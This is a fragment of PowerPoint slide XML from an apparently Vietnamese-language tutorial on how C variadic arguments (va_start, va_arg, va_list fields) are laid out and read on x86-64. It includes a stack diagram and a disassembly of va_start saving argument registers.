          <p:cNvPr id="118" name="TextBox 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457560" y="685800"/>
            <a:ext cx="10964880" cy="5938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000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>        Địa chỉ cao hơn</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 Stack arguments (nếu có)      │ [rbp + 0x10]</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 Return address                │ [rbp + 8]</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 Saved RBP                     │ [rbp]</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 count = 3                     │ [rbp - 0xe4]</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 Local variables khác          │</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 va_list fields                │</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  gp_offset = 8                │ [rbp – 0xe0] =&gt; Offset để lấy từ register area </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ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>│  fp_offset = 0x30             │ [rbp – 0xdc] =&gt; Offset để lấy từ xmm register area </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ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>│  overflow_arg_area            │ [rbp – 0xd8] =&gt; Trỏ tới stack arguments ở trên cùng </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ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>│  reg_save_area                │ [rbp - 0xd0] =&gt; Trỏ tới register save area ở dưới </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ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>├──────────────────────────────┤</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ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>│ Register Save Area            │ [rbp - 0xb0]</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ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>│  +0x28: R9        +0x20: R8   │</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ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>│  +0x18: RCX = 30  +0x10: RDX  │</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ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>│  +0x08: RSI = 10  +0x00: RDI  │</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ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>└──────────────────────────────┘</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ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>        Địa chỉ thấp hơn</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9" name="TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10964880" cy="8150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overflow_arg_area</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="120" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10964880" cy="2905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2800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Như đã biết, nếu gọi với nhiều argument, x86 sẽ đẩy phần dư lên stack.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Mà va_arg cần một cơ chế để tìm tới địa chỉ stack đó.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>=&gt;  overflow_arg_area chứa địa chỉ của vùng Stack arguments đó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pP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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10964880" cy="8150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va_arg</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="122" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="2057400"/>
            <a:ext cx="8046000" cy="2272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2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Logic dùng để tìm argument : </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>1. Lấy từ register save area</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>2.Hết thì lấy từ overflow_arg_area</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="123" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6171840" y="1828800"/>
            <a:ext cx="5486040" cy="365688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 name="TextBox 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="1227240" cy="541800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="125" name="TextBox 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="687960" y="762840"/>
            <a:ext cx="10964880" cy="2142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3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Vì va_start và va_arg đều là các macro nên rất khó tìm source code (im lazy), mà source của nó cũng chỉ là asm thôi ?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Nên một cách đơn giản để hiểu đó chính là :  </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="126" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="2971800"/>
            <a:ext cx="4799880" cy="599076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7" name="TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10964880" cy="8150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790" b="1" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DEBUG — va_start</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2790" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="128" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1097280"/>
            <a:ext cx="10964880" cy="3152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500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>va_start :</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x0000000000400466 &lt;+0&gt;:    55                                push   rbp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x0000000000400467 &lt;+1&gt;:    48 89 e5                          mov    rbp,rsp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x000000000040046a &lt;+4&gt;:    48 81 ec f0 00 00 00              sub    rsp,0xf0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>; Nạp registers vào register area </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x0000000000400471 &lt;+11&gt;:   89 bd 1c ff ff ff                 mov    DWORD PTR [rbp-0xe4],edi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x0000000000400477 &lt;+17&gt;:   48 89 b5 58 ff ff ff              mov    QWORD PTR [rbp-0xa8],rsi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x000000000040047e &lt;+24&gt;:   48 89 95 60 ff ff ff              mov    QWORD PTR [rbp-0xa0],rdx</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x0000000000400485 &lt;+31&gt;:   48 89 8d 68 ff ff ff              mov    QWORD PTR [rbp-0x98],rcx</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x000000000040048c &lt;+38&gt;:   4c 89 85 70 ff ff ff              mov    QWORD PTR [rbp-0x90],r8</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x0000000000400493 &lt;+45&gt;:   4c 89 8d 78 ff ff ff              mov    QWORD PTR [rbp-0x88],r9</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="129" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1190880" y="4114800"/>
            <a:ext cx="174960" cy="340560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="87480" tIns="45000" rIns="87480" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="130" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="4751280"/>
            <a:ext cx="10007640" cy="118656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2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Lưu các register chứa arguments vào vùng nhớ register save area </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>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TextBox 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="2901240" cy="5148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790" b="1" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DEBUG — va_start</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2790" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="132" name="TextBox 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1097280"/>
            <a:ext cx="10964880" cy="2347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300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>va_start :</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>…...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
